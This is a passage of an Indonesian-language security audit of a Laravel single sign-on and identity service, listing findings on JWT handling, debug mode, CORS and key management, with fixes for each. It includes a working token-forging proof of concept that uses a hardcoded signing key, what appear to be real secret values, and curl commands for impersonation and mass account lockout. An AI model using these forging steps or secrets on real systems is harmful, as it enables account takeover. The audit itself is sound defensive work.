    // Tidak ada klaim 'aud'
];

// Token dapat diverifikasi di endpoint manapun
// SsoVerifyController hanya memeriksa:
// 1. Token valid (tanda tangan, kedaluwarsa, pencabutan)
// 2. Tipe token adalah 'access'
// 3. Pengguna ada
// Controller TIDAK memverifikasi apakah token diterbitkan untuk aplikasi yang meminta
```

Klaim `roles_by_app` pada token Sistem #1 berisi **semua** peran yang dimiliki pengguna di **semua** aplikasi. Hal ini berarti token yang diterbitkan untuk Aplikasi A memuat informasi sensitif mengenai struktur peran Aplikasi B.

#### Dampak

1. **Eskalasi hak istimewa horizontal:** Token yang diterbitkan untuk Aplikasi A dapat diberikan ke endpoint verify milik Aplikasi B. Jika Aplikasi B dengan naif memercayai peran/klaim token tersebut tanpa memeriksa audiens, pengguna akan mendapatkan peran yang mereka miliki di Aplikasi B melalui token Aplikasi A.

2. **Pengeksposan informasi:** Payload `roles_by_app` membocorkan struktur otorisasi lengkap di semua aplikasi. Pengguna yang memiliki token untuk satu aplikasi dengan keamanan rendah dapat men-decode (bukan verifikasi, hanya decode base64) token tersebut dan mengetahui peran apa yang mereka miliki di aplikasi lain.

#### Rekomendasi

**Segera (1 hari):**
- Tambahkan klaim `aud` ke semua penerbitan token:

```php
// TokenBuilder.php
$payload['aud'] = $extra['app'] ?? 'iam-server';

// JWTTokenService.php
$payload['aud'] = $application->app_key;
```

**Jangka Pendek (1 minggu):**
- Tambahkan validasi audiens pada endpoint verifikasi:

```php
// VerifyIAMAccessToken.php
if (isset($decoded->aud) && $decoded->aud !== $expectedAppKey) {
    return response()->json(['error' => 'Token audience mismatch'], 401);
}

// SsoVerifyController
if (isset($payload['aud']) && $payload['aud'] !== $request->input('expected_aud')) {
    throw new \Exception('Token audience mismatch');
}
```

- Hapus `roles_by_app` dari payload token; hanya sertakan peran untuk aplikasi audiens yang dituju

---

### F-008: Terdapat Beberapa Implementasi JWT yang Bertentangan

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | 🟠 **Tinggi** |
| **Komponen** | Seluruh arsitektur |
| **File** | Berbagai file |
| **CWE** | CWE-1104: Penggunaan Komponen Pihak Ketiga yang Tidak Terpelihara |
| **CVSS 3.1** | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |

#### Deskripsi

Basis kode mengandung **tiga implementasi JWT yang terpisah** dengan struktur payload, logika verifikasi, dan konfigurasi kunci yang berbeda:

##### Perbandingan Implementasi

| Aspek | TokenBuilder | JWTTokenService | TokenService |
|--------|:------------:|:---------------:|:------------:|
| **Pustaka** | firebase/jwt | firebase/jwt | PHP Mentah |
| **Lokasi kode** | `Domain/Iam/Services/` | `Services/` | `Services/Sso/` |
| **Kolom payload** | sub, nip, email, name, apps, roles_by_app, unit, employee_id, type, extra | sub, name, email, app_key, roles, session_id, type | sub, nip, email, name, app, roles, iat, exp |
| **Sumber kunci** | `config('iam.signing_key')` | `config('iam.signing_key')` | `Config::get('sso.secret')` |
| **decode base64** | ✅ Ya | ✅ Ya | ✅ Ya |
| **Cek kedaluwarsa**| Dalam verify() | Dalam firebase/jwt | Cek timestamp manual |
| **Cek logout** | ✅ user_logout_at | ❌ Hilang | ❌ Hilang |
| **Cek sesi** | ✅ Model sesi | ✅ Model sesi | ❌ Hilang |
| **Pergeseran waktu (Clock skew)**| Jeda 60s | Tidak ada | Tidak ada |
| **Logging** | Minimal | Minimal | Komprehensif (SsoLogger) |

##### Perbedaan Struktur Payload

```
Token TokenBuilder (Sistem #1):
  { sub, nip, email, name, apps: [...], roles_by_app: {...}, unit, employee_id, type, iss, iat, exp, app (via extra) }

Token JWTTokenService (Sistem #2):
  { sub, name, email, app_key, roles: [...], session_id, type, iss, iat, exp }

Token TokenService (Sistem #3):
  { sub, nip, email, name, app, roles: [...], iss, iat, exp }
```

Catatan: `TokenService` menggunakan penandatanganan HMAC via `hash_hmac('sha256', ...)` yang secara fungsional identik dengan HS256, namun kurang menggunakan perbandingan waktu-konstan dalam proses penandatanganan intinya (metode `verify` dengan benar menggunakan `hash_equals()`).

#### Mengapa Ini Berbahaya

1. **Pencabutan yang tidak konsisten:** Fungsi `verify()` Sistem #1 memeriksa `user_logout_at`; sedangkan `verifyToken()` Sistem #2 tidak. Sebuah token yang dicabut di Sistem #1 akan tetap valid di Sistem #2.

2. **Validasi sesi yang tidak konsisten:** Keduanya #1 dan #2 memeriksa model Session, tetapi di bawah kondisi yang sedikit berbeda — Sistem #1 memeriksa dalam `verify()`, Sistem #2 memeriksa dalam `verifyToken()`.

3. **Risiko perbedaan kunci:** Jika `signing_key` dan `sso.secret` berbeda (satu diperbarui tetapi yang lain tidak), token Sistem #3 menjadi tidak dapat diverifikasi sementara token Sistem #1/#2 masih berfungsi, atau sebaliknya.

4. **Beban pemeliharaan:** Setiap perbaikan keamanan harus diterapkan pada tiga jalur kode yang terpisah. Melewatkan satu jalur berarti perbaikan tidak tuntas.

#### Rekomendasi

**Jangka Pendek (2 minggu):**
1. **Konsolidasikan** semua operasi token ke dalam `TokenBuilder` sebagai sumber kebenaran tunggal (single source of truth)
2. **Hapus** implementasi HMAC kustom dari `TokenService` dan gunakan `firebase/jwt`
3. **Tambahkan** pengecekan `user_logout_at` dan `session_active` ke `JWTTokenService::verifyToken()`
4. **Tambahkan** pengecekan yang sama ke `SsoVerifyController` (yang menggunakan `TokenBuilder::verify()` — sudah memilikinya)

```php
// Langkah 1: Konsolidasikan konfigurasi
// config/iam.php — sumber kebenaran tunggal
'signing_key' => env('IAM_SIGNING_KEY'),

// Langkah 2: JWTTokenService harus mendelegasikan atau mencerminkan TokenBuilder
// Langkah 3: Hapus atau depresi TokenService
```

---

### F-009: APP_DEBUG Aktif di Produksi

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | 🔴 **Kritis** |
| **Komponen** | Konfigurasi `.env` |
| **File** | `.env:4` |
| **CWE** | CWE-489: Kode Debug Aktif |
| **CVSS 3.1** | 8.6 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L) |

#### Deskripsi

Lingkungan produksi mengaktifkan `APP_DEBUG=true`:

```env
# .env (production)
APP_ENV=production
APP_DEBUG=true
```

Dengan mengaktifkan mode debug Laravel, `Whoops\Handler\PrettyPageHandler` merender halaman error detail yang berisi:
- Stack trace lengkap
- Variabel environment (termasuk secret)
- Nilai konfigurasi
- Status server
- Konteks kode sumber di sekitar baris yang error
- Data kueri database pada beberapa konteks error
- Data permintaan (request)

#### Dampak

Seorang penyerang yang mengirim permintaan bermasalah (malformed requests) dapat memicu pengecualian yang membocorkan:
```env
APP_KEY=base64:dt4sYZlqr9RYQWIGMmLVBmY0rEiit7hkwfXcdaaGnio=    # ← PENGUNGKAPAN PENUH
DB_PASSWORD=password                                                # ← PENGUNGKAPAN PENUH
IAM_JWT_SECRET=base64:G8w0qytVP8V+Mml5pYqm90R9m7AdfltGk1GCXMGq2qw= # ← PENGUNGKAPAN PENUH
AWS_SECRET_ACCESS_KEY=password
```

#### Rekomendasi

```env
APP_DEBUG=false
APP_ENV=production
```

Setelah mengubahnya, jalankan:
```bash
php artisan config:clear
php artisan route:clear
php artisan view:clear
```

---

### F-010: Konfigurasi Sesi Tidak Aman

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | 🟡 **Sedang** |
| **Komponen** | Konfigurasi Sesi |
| **File** | `.env`, `config/session.php` |
| **CWE** | CWE-614: Cookie Sensitif di Sesi HTTPS Tanpa Atribut 'Secure' |

#### Deskripsi

```env
SESSION_ENCRYPT=false         # Data sesi disimpan dalam bentuk plaintext di database
SESSION_SECURE_COOKIE=false   # Cookie sesi dikirim melalui HTTP
SESSION_HTTP_ONLY=true        # ✅ Benar
SESSION_SAME_SITE=lax         # Kurang optimal — 'strict' atau 'lax' dapat diterima
```

#### Dampak

1. **Pengeksposan data sesi di database:** Siapa saja yang memiliki akses baca ke tabel `sessions` dapat melihat isi sesi. Sesi tersebut menyimpan `user_id`, `user_status`, alamat IP, dan terkadang konteks aplikasi SSO.

2. **Cookie sesi melalui HTTP:** Pada tahap produksi, jika terdapat rute HTTP ke server (miskonfigurasi redirect, akses IP langsung), cookie sesi dapat dicegat.

#### Rekomendasi

```env
SESSION_ENCRYPT=true
SESSION_SECURE_COOKIE=true
SESSION_SAME_SITE=strict
```

---

### F-011: Pencocokan Pola Origin CORS Longgar

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | 🟡 **Sedang** |
| **Komponen** | Konfigurasi CORS |
| **File** | `config/cors.php:30-32` |
| **CWE** | CWE-942: Kebijakan Lintas-domain Permisif dengan Domain yang Tidak Terpercaya |

#### Deskripsi

```php
'allowed_origins_patterns' => [
    env('FRONTEND_HOST_PATTERN', '/localhost|127\.0\.0\.1|192\.168/'),
],
```

Pola regex `localhost|127\.0\.0\.1|192\.168` sangat permisif karena:
- `localhost` dapat muncul di mana saja dalam nama host: `evil-localhost.com` tetap cocok
- Awalan `192.168` hanya memeriksa oktet: `192.168.1.1.evil.com` tetap cocok
- `supports_credentials` bernilai `true`, yang berarti request CORS berkredensial (credentialed CORS requests) diizinkan

#### Dampak

```javascript
// Situs jahat yang di-host di "evil-localhost.com" dapat membuat request CORS berkredensial
fetch('https://iam.example.com/api/sso/admin/exchange-code', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ code: '...' })
});
// Origin: https://evil-localhost.com → cocok dengan pola → kredensial diterima
```

Walaupun `SESSION_SAME_SITE=lax` memitigasi CSRF pada request non-GET, hal ini melemahkan lapisan pertahanan terhadap serangan CORS berbasis fetch.

#### Rekomendasi

```php
'allowed_origins_patterns' => [
    '/^https?:\/\/(localhost|127\.0\.0\.1|192\.168\.\d{1,3}\.\d{1,3})(:\d+)?$/',
],
```

---

### F-012: Klaim nbf Hilang / Jendela Pergeseran Waktu (Clock Skew)

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | 🟡 **Sedang** |
| **Komponen** | Semua penerbit token |
| **CWE** | CWE-349: Penerimaan Data Luar yang Tidak Terpercaya |
| **CVSS 3.1** | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N) |

#### Deskripsi

Tidak ada satu pun implementasi yang menetapkan klaim `nbf` (Not Before). Pustaka `firebase/jwt` memiliki default jeda 0 detik (tidak ada jendela penerimaan sebelum kedaluwarsa), namun `nbf` tidak disetel.

Pustaka `firebase/jwt` secara otomatis memvalidasi `nbf` dengan `$leeway` yang dikonfigurasi. `TokenBuilder` menetapkan:
```php
JWT::$leeway = 60;  // Jeda 60 detik secara global untuk clock skew
```

Tanpa `nbf`:
- **Tidak ada penanggalan ke depan (forward-dating):** Token langsung valid pada saat diterbitkan
- **Jeda (leeway) bersifat sepihak:** Jeda 60 detik hanya memengaruhi token yang tampaknya telah kedaluwarsa (`exp` awal), tidak untuk token yang seharusnya belum valid

Meskipun hilangnya `nbf` lazim terjadi pada penyebaran server tunggal, bila dikombinasikan dengan jeda 60 detik, token yang diterbitkan secara sah bisa saja diverifikasi hingga 60 detik setelah waktu `exp`-nya berakhir.

#### Rekomendasi

```php
// Tambahkan klaim nbf
$payload['nbf'] = $now;

// Untuk refresh token, tambahkan offset nbf yang wajar
$payload['nbf'] = $now - 30;  // Izinkan clock skew 30 detik
```

---

### F-013: Tidak Ada Mekanisme Rotasi Kunci Otomatis

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | 🟡 **Sedang** |
| **Komponen** | Manajemen kunci |
| **CWE** | CWE-324: Penggunaan Kunci Melewati Tanggal Kedaluwarsanya |

#### Deskripsi

Tidak ada mekanisme untuk merotasi kunci penandatanganan JWT. Konfigurasi `previous_keys` memang ada di `config/app.php` tetapi **tidak direferensikan** di mana pun pada kode verifikasi JWT:

```php
// config/app.php:102-106 — Ada tetapi tidak digunakan
'previous_keys' => [
    ...array_filter(
        explode(',', env('APP_PREVIOUS_KEYS', ''))
    ),
],
```

Tidak ada kode yang meneruskan `previous_keys` ke `JWT::decode()` sebagai kumpulan kunci fallback. Ini berarti:
- Rotasi kunci akan segera membatalkan semua token yang beredar
- Tidak ada masa tenggang (grace period) untuk penerbitan ulang token
- Praktik yang disarankan untuk memiliki kunci dengan header `kid` dan daftar kunci yang valid tidak diimplementasikan

#### Rekomendasi

```php
// Pada konstruktor TokenBuilder
private array $validKeys = [];

public function __construct(...)
{
    $secret = config('iam.signing_key');
    $previousKeys = config('app.previous_keys', []);
    
    // Kunci saat ini
    $this->validKeys['current'] = new Key($this->decodeBase64($secret), $this->algorithm);
    
    // Kunci sebelumnya untuk masa tenggang rotasi
    foreach ($previousKeys as $i => $oldKey) {
        $this->validKeys["prev_{$i}"] = new Key($this->decodeBase64($oldKey), $this->algorithm);
    }
}

public function decode(string $token): TokenClaims
{
    $header = JWT::splitToken($token)[0];
    $kid = $header['kid'] ?? 'current';
    
    if (!isset($this->validKeys[$kid])) {
        throw new \Exception('Unknown key ID');
    }
    
    $decoded = JWT::decode($token, $this->validKeys[$kid]);
    // ...
}
```

---

### F-014: Ambiguitas Fallback Rahasia HMAC

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | ⚪ **Informasional** |
| **Komponen** | `config/iam.php` |
| **File** | `config/iam.php:81-83` |
| **CWE** | CWE-656: Ketergantungan pada Keamanan Melalui Ketidakjelasan (Security Through Obscurity) |

#### Deskripsi

```php
'sso_secret' => env('IAM_SSO_SECRET', env('SSO_SECRET', env('IAM_JWT_SECRET'))),
```

Fallback bersarang tiga tingkat ini berarti bahwa secret yang dikonfigurasi bisa berasal dari salah satu dari tiga variabel environment. Memeriksa nilai mana yang sebenarnya digunakan membutuhkan inspeksi saat runtime. Jika seseorang menyetel `IAM_SSO_SECRET` ke suatu nilai dan `SSO_SECRET` ke nilai yang berbeda, perilakunya bergantung pada urutan penerapan dan file mana yang dimuat terlebih dahulu.

Komentar konfigurasi menyatakan bahwa ini adalah "rahasia bersama yang digunakan untuk verifikasi HMAC backchannel," tetapi nilai tersebut tidak pernah digunakan untuk verifikasi HMAC aktual terhadap permintaan klien — setidaknya tidak di jalur kode mana pun yang diaudit.

#### Rekomendasi

Sederhanakan menjadi satu variabel eksplisit:
```php
'sso_secret' => env('IAM_SSO_SECRET'),
```

Jika tidak ada, lemparkan error, catat error kritis, atau tolak booting.

---

### F-015: Endpoint Introspeksi Menjadi Oracle Error

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | 🟡 **Sedang** |
| **Komponen** | `SsoFlowService::introspect`, `SsoTokenController::introspect` |
| **File** | `app/Services/Sso/SsoFlowService.php:162-206`, `app/Domain/Iam/Http/Controllers/SsoTokenController.php:145-172` |
| **CWE** | CWE-208: Discrepansi Timing Teramati / CWE-203: Discrepansi Teramati |

#### Deskripsi

Endpoint introspeksi memiliki pesan error yang berbeda untuk kondisi kegagalan yang berbeda:

```php
// SsoFlowService::introspect()
try {
    $application = $this->ssoClientService->findApplication($request->app_key);  // 404 vs 401
} catch (\Throwable) {
    return response()->json(['active' => false]);  // ← Respons generik
}

if (!$this->ssoClientService->verifySecret($application, $request->app_secret)) {
    return response()->json(['active' => false]);  // ← Respons generik yang sama
}
```

Namun, varian `SsoTokenController::introspect()` lebih bermasalah:

```php
// SsoTokenController::introspect()
try {
    $claims = $this->tokenBuilder->verify($request->token);
    return response()->json(['active' => true, ...]);    // ← Mengembalikan klaim lengkap
} catch (\Exception $e) {
    return response()->json([
        'active' => false,
        'error' => $e->getMessage(),                     // ← Membocorkan alasan!
    ]);
}
```

Ini mengembalikan alasan pasti mengapa verifikasi gagal:

| Respons | Hal yang dipelajari Penyerang |
|----------|----------------|
| `"Token has been revoked due to user logout."` | Pengguna ada, token dicabut pada waktu tertentu |
| `"Invalid or expired token:"` + detail internal | Algoritma, key ID, timestamp kedaluwarsa |
| `"Token has expired."` | Struktur token valid, pengguna ada, token telah kedaluwarsa |
| `"Token session is inactive..."` | Sesi pengguna tidak aktif |

Kombinasi tersebut, memungkinkan penyerang untuk:
1. Menyelidiki apakah ID pengguna tertentu ada (dengan membuat token dengan klaim `sub` yang berbeda)
2. Memvalidasi struktur token palsu
3. Menentukan status pencabutan pasti dari seorang pengguna

#### Rekomendasi

Konsolidasikan kedua endpoint introspeksi untuk mengembalikan informasi seminimal mungkin:

```php
try {
    $claims = $this->tokenBuilder->verify($request->token);
    return response()->json(['active' => true, ...]);
} catch (\Exception $e) {
    // Selalu kembalikan respons yang sama terlepas dari alasan kegagalan
    return response()->json(['active' => false]);  // ← Tidak ada kolom error
}
```

---

### F-016: Penugasan Middleware Duplikat

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | ⚪ **Informasional** |
| **Komponen** | `VerifyIAMAccessToken` |
| **File** | `app/Http/Middleware/VerifyIAMAccessToken.php:61-62` |

```php
'iam_user_roles' => $decoded->roles ?? [],
'iam_user_roles' => $decoded->roles ?? [],  // ← Duplikat
```

Kunci yang sama diatur dua kali dalam penggabungan array permintaan. Ini tidak berbahaya tetapi menunjukkan adanya kesalahan copy-paste yang dapat menyembunyikan penugasan yang terlewat di masa mendatang.

---

### F-017: Sinkronisasi Peran Mode-Tarik (Pull-Mode) Membuat Peran Secara Default

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | ⚪ **Informasional** |
| **Komponen** | Konfigurasi |
| **File** | `config/iam.php:217-220` |

```php
'role_sync_from_client_allow_create' => env('IAM_ROLE_SYNC_FROM_CLIENT_ALLOW_CREATE', false),
```

Default-nya adalah `false`, tetapi komentar mengatakan "IAM membuat peran yang ada di klien tetapi tidak di IAM." Jika aplikasi klien mengirimkan peran dengan nama yang sama dengan peran sistem di IAM, sinkronisasi tersebut bisa menyebabkan duplikasi atau konflik.

---

### F-018: Kunci Penandatanganan JWT Global Tunggal — Tidak Ada Isolasi Per-Aplikasi

| Atribut | Nilai |
|-----------|-------|
| **Keparahan** | 🔴 **Kritis** |
| **Komponen** | `config/iam.php`, `TokenBuilder`, `JWTTokenService`, `Application` |
| **File** | `config/iam.php:83-95`, `app/Domain/Iam/Services/TokenBuilder.php:21-30`, `app/Services/JWTTokenService.php:20-30`, `app/Domain/Iam/Models/Application.php:100-103` |
| **CWE** | CWE-287: Autentikasi Tidak Tepat / CWE-1230: Paparan Informasi Sensitif Melalui Metadata |
| **CVSS 3.1** | 9.3 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N) |

#### Deskripsi

**Setiap aplikasi klien menggunakan kunci penandatanganan JWT yang sama persis.** Tidak ada isolasi kunci per-aplikasi. `IAM_JWT_SECRET` tunggal menandatangani token untuk SEMUA aplikasi yang terdaftar (`siimut`, `incident`, `admin-panel`, dan aplikasi klien lain di masa mendatang).

Model Application menyimpan kolom `secret` **terpisah** yang digunakan untuk autentikasi klien OAuth2 (`app_secret` / `client_secret`), namun secret ini **tidak pernah** digunakan sebagai kunci penandatanganan JWT:

```php
// Application.php:100-103
public function verifySecret(string $secret): bool
{
    // Ini hanya memverifikasi client_secret untuk pertukaran token OAuth2
    // Ini TIDAK digunakan untuk penandatanganan JWT
    return hash_equals($this->secret, hash('sha256', $secret));
}
```

Sementara itu, kunci penandatanganan global berasal dari satu nilai konfigurasi tunggal:

```php
// config/iam.php:83-95
'jwt_secret' => env('IAM_JWT_SECRET', env('APP_KEY')),
'signing_key' => env('IAM_SIGNING_KEY', env('IAM_JWT_SECRET')),
```

Baik `TokenBuilder` maupun `JWTTokenService` menggunakan kunci identik ini:

```php
// TokenBuilder.php:21-30
$secret = config('iam.signing_key', config('app.key'));
if (is_string($secret) && str_starts_with($secret, 'base64:')) {
    $decoded = base64_decode(substr($secret, 7), true);
    $secret = $decoded !== false ? $decoded : $secret;
}
$this->secretKey = $secret;

// JWTTokenService.php:20-30 — Kode identik, sumber konfigurasi sama
$secret = config('iam.signing_key', config('app.key'));
if (is_string($secret) && str_starts_with($secret, 'base64:')) {
    $decoded = base64_decode(substr($secret, 7), true);
    $secret = $decoded !== false ? $decoded : $secret;
}
$this->secretKey = $secret;
```

#### Dampak

##### 1. Kunci Bersama Berarti Kepercayaan Bersama — Setiap Klien Dapat Menyamar Sebagai Klien Lain

Karena semua token ditandatangani dengan kunci yang sama, Aplikasi A dapat **memalsukan token untuk Aplikasi B**:

```
Aplikasi A (siimut)  ── mengetahui IAM_JWT_SECRET ──┐
                                                    │
                                                    ├── Palsukan token dengan:
                                                    │    { sub: 1, app: "incident", roles: ["admin"] }
                                                    │
Aplikasi B (incident) ── menggunakan IAM_JWT_SECRET ┘
   untuk verifikasi token
   
Hasil: Aplikasi A dapat menyamar sebagai pengguna manapun di Aplikasi B.
```

Ini **bukanlah kerentanan teoretis** — ini adalah desain arsitekturnya. Setiap aplikasi yang menerima JWT dari IAM sudah memiliki kunci untuk mendekode dan memverifikasinya. Namun jika ada aplikasi klien yang berhasil dikompromikan, penyerang bisa memalsukan token untuk SEMUA aplikasi lainnya.

##### 2. Tidak Ada Rotasi Kunci Per-Aplikasi

Jika ada aplikasi klien yang dinonaktifkan atau dikompromikan, kunci global tidak dapat dirotasi tanpa memengaruhi SEMUA aplikasi lain. Merotasi kunci berarti:
- Semua token beredar untuk semua aplikasi menjadi tidak valid
- Semua aplikasi harus diperbarui dengan kunci baru secara bersamaan
- Peluncuran bertahap (staged rollout) tidak memungkinkan dilakukan

##### 3. Payload Token Membocorkan Struktur Internal Aplikasi

Karena klaim `roles_by_app` memuat peran untuk **semua** aplikasi yang dapat diakses pengguna (Token Sistem #1), token yang ditujukan untuk satu aplikasi akan membocorkan struktur otorisasi dari semua aplikasi lainnya:

```json
{
  "sub": 42,
  "app": "incident",
  "roles_by_app": {
    "incident": ["viewer"],
    "siimut": ["admin", "operator"],           // ← Bocor!
    "admin-panel": ["super-admin"]             // ← Bocor!
  }
}
```

Aplikasi mana pun yang menerima token ini dapat mendekode (base64) dan melihat peta otorisasi selengkapnya.

##### 4. Konteks Historis — Alasan Dilakukan

Pola ini (kunci global tunggal untuk semua aplikasi) kemungkinan dipilih untuk kesederhanaan operasional: setiap aplikasi klien hanya membutuhkan satu nilai konfigurasi (`IAM_JWT_SECRET`) untuk memverifikasi token. Meskipun demikian, hal ini mengorbankan isolasi keamanan demi kenyamanan — seluruh federasi berbagi satu trust anchor.

##### 5. `.env.example` Memperparah Masalah

Contoh file environment mendistribusikan kunci hardcode yang sama:
```env
# .env.example:127
IAM_JWT_SECRET=base64:G8w0qytVP8V+Mml5pYqm90R9m7AdfltGk1GCXMGq2qw=
```

File `.env` yang asli menggunakan nilai yang sama:
```env
# .env:126 — PRODUKSI DAN CONTOH IDENTIK!
IAM_JWT_SECRET=base64:G8w0qytVP8V+Mml5pYqm90R9m7AdfltGk1GCXMGq2qw=
```

Ini berarti:
- Kunci penandatanganan produksi ada dalam **dokumentasi publik** (`.env.example` dikomit ke git)
- Siapa pun yang memiliki akses ke repositori dapat memalsukan token produksi
- Kunci tersebut terlihat identik dengan yang ada di `.env.example` pada riwayat git

#### Bukti Konsep (Proof of Concept)

```bash
# Langkah 1: Ekstrak kunci penandatanganan global dari .env aplikasi klien mana pun
$ grep IAM_JWT_SECRET /etc/client-apps/siimut/.env
IAM_JWT_SECRET=base64:G8w0qytVP8V+Mml5pYqm90R9m7AdfltGk1GCXMGq2qw=

# Langkah 2: Palsukan token untuk aplikasi berbeda (incident) sebagai super-admin
$ python3 -c "
import base64, json, hmac, hashlib

header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({
    'sub': 1, 'name': 'Hacker', 'email': 'hacker@evil.com',
    'app': 'incident', 'roles': ['super-admin'], 'iat': 0, 'exp': 9999999999
}).encode()).rstrip(b'=').decode()

key = base64.b64decode('G8w0qytVP8V+Mml5pYqm90R9m7AdfltGk1GCXMGq2qw=')
sig = base64.urlsafe_b64encode(hmac.new(key, f'{header}.{payload}'.encode(), hashlib.sha256).digest()).rstrip(b'=').decode()

print(f'{header}.{payload}.{sig}')
"

# Langkah 3: Gunakan token palsu untuk mengakses aplikasi incident
curl -H "Authorization: Bearer <forged-token>" https://incident.internal/api/sso/verify
# → 200 OK, terautentikasi sebagai super-admin
```

#### Perbandingan: Kunci Global vs Kunci Per-Aplikasi

| Kemampuan | Kunci Global (Saat ini) | Kunci Per-Aplikasi (Disarankan) |
|------------|:-------------------:|:-------------------------:|
| Aplikasi A dapat menyamar jadi Aplikasi B | ✅ Ya | ❌ Tidak |
| Satu klien terkompromi memengaruhi yang lain | ✅ Ya | ❌ Tidak |
| Rotasi kunci per-aplikasi | ❌ Mustahil | ✅ Independen |
| Kompleksitas operasional | Rendah | Sedang |
| Jumlah kunci untuk dikelola | 1 kunci | N kunci |
| Konfigurasi aplikasi klien dibutuhkan | 1 nilai (`IAM_JWT_SECRET`) | Kunci spesifik tiap klien |
| Struktur aplikasi internal bocor di token | ✅ Ya (roles_by_app) | ❌ Tidak (hanya peran sendiri) |
| Dampak dari kebocoran kunci tunggal | Semua aplikasi diretas | Hanya satu aplikasi diretas |

#### Rekomendasi

**Jangka Pendek (1 minggu):**

1. **Hapus `roles_by_app` dari payload token** — cukup sertakan peran untuk aplikasi target:

```php
// TokenClaims.php:toPayload()
// Hapus bagian ini:
$payload['roles_by_app'] = $this->rolesByApp;

// Ganti hanya dengan peran aplikasi target
$targetApp = $this->extra['app'] ?? null;
if ($targetApp && isset($this->rolesByApp[$targetApp])) {
    $payload['roles'] = $this->rolesByApp[$targetApp];
}
```

2. **Buat kunci produksi yang unik** — kunci saat ini di `.env` sama dengan `.env.example`:

```bash
php -r "echo 'base64:' . base64_encode(random_bytes(32));"
# → base64:<unique-64-chars>
```

Perbarui `.env` dengan kunci baru, dan sebarkan (deploy) kunci baru ke semua aplikasi klien.

3. **Hapus kunci hardcoded dari `.env.example`** — ganti dengan placeholder:

```env
# .env.example
IAM_JWT_SECRET=base64:GANTI_SAYA_DENGAN_NILAI_ACAK_UNIK
```

**Jangka Menengah (2-4 minggu) — Isolasi Kunci Per-Aplikasi:**

Implementasikan pola di mana setiap aplikasi klien memiliki kunci penandatanganan JWT sendiri yang diturunkan dari application secret, atau gunakan registri key-per-app:

```php
// config/iam.php
'signing_keys' => [
    // Kunci penandatanganan per-aplikasi, disimpan di vault aman atau dibuat dari secret setiap aplikasi
    'siimut' => env('IAM_SIGNING_KEY_SIIMUT'),
    'incident' => env('IAM_SIGNING_KEY_INCIDENT'),
    // Fallback ke kunci global untuk aplikasi lama (legacy)
    '_default' => env('IAM_SIGNING_KEY'),
],
```

```php
// TokenBuilder.php — pilih kunci berdasarkan aplikasi target
public function __construct()
{
    $this->globalKey = $this->resolveKey(config('iam.signing_key'));
    $this->perAppKeys = config('iam.signing_keys', []);
}

public function buildTokenForUser(User $user, array $extra = []): string
{
    $targetApp = $extra['app'] ?? '_default';
    $key = $this->perAppKeys[$targetApp] ?? $this->globalKey;
    return $this->encodeWithKey($claims, $key);
}
```

Pada sisi verifikasi klien, setiap aplikasi **hanya** menggunakan **kuncinya sendiri**:

```php
// JWTTokenService.php — verifikasi dengan kunci spesifik aplikasi
public function verifyToken(string $token, ?string $appKey = null): object
{
    $secret = $appKey 
        ? config("iam.signing_keys.{$appKey}", $this->secretKey)
        : $this->secretKey;
    $decoded = JWT::decode($token, new Key($secret, $this->algorithm));
    // ...
}
```

**Jangka Panjang (2-3 bulan) — Infrastruktur Kunci Per-Aplikasi Terintegrasi:**

1. Tambahkan kolom `app_signing_key` ke tabel `applications` (bisa null (nullable) demi kompatibilitas ke belakang)
2. Simpan kunci HMAC unik untuk setiap aplikasi, dibuat secara otomatis saat aplikasi dibuat
3. Tambahkan header `kid` (Key ID) ke token JWT agar pemverifikasi tahu kunci mana yang akan digunakan
4. Izinkan endpoint rotasi kunci per-aplikasi

```php
// Tambahkan ke model Application
public function getSigningKey(): string
{
    return $this->app_signing_key ?? config('iam.signing_key');
}

// TokenBuilder menambahkan kid ke header
$header = [
    'alg' => 'HS256',
    'typ' => 'JWT',
    'kid' => $application->app_key,  // Key ID merujuk ke aplikasi
];
```

Hierarki kunci:
```
Kunci fallback global (lama)
  └── Kunci penandatanganan Aplikasi "siimut" (unik per aplikasi)
  └── Kunci penandatanganan Aplikasi "incident" (unik per aplikasi)
  └── Kunci penandatanganan Aplikasi "admin-panel" (unik per aplikasi)
```

Masing-masing aplikasi *hanya tahu kuncinya sendiri*. Peretasan pada satu aplikasi tidak memengaruhi aplikasi lainnya.

---

## 4. Skenario Serangan

### Skenario A: Pencegatan Token → Pengambilalihan Akun

```
1. Pengguna mengunjungi login IAM, memasukkan kredensial
2. IAM mengarahkan kembali (redirect) ke URL callback aplikasi klien dengan token dalam query string
3. Penyerang memiliki akses ke:
   a) Log reverse proxy (miskonfigurasi akses)
   b) Riwayat browser (komputer bersama)
   c) Lalu lintas jaringan (segmen jaringan tidak aman)
4. Penyerang mengekstrak token dari URL
5. Penyerang memanggil POST /api/sso/verify dengan token → mendapatkan info pengguna
6. Penyerang memanggil POST /api/sso/token/issue → mendapatkan access token baru
7. Penyerang mengakses aplikasi klien sebagai pengguna yang terautentikasi
```

**Kerentanan terkait:** F-001 (token dalam URL), F-008 (verifikasi tidak konsisten)

### Skenario B: Penguncian Akun Massal

```
1. Penyerang mengenumerasi ID pengguna (mis. 1-1000)
2. Untuk setiap userId:
   curl -X POST https://iam.example.com/api/iam/notify-token-expired \
     -d '{"user_id": <id>, "app_key": "test", "expired_at": "..."}'
3. Setiap panggilan mengatur Cache::put("user_logout_at:{userId}", time())
4. Setiap token yang beredar untuk pengguna tersebut menjadi tidak valid
5. Pengguna harus melakukan autentikasi ulang — tidak bisa mengakses aplikasi klien apa pun
```

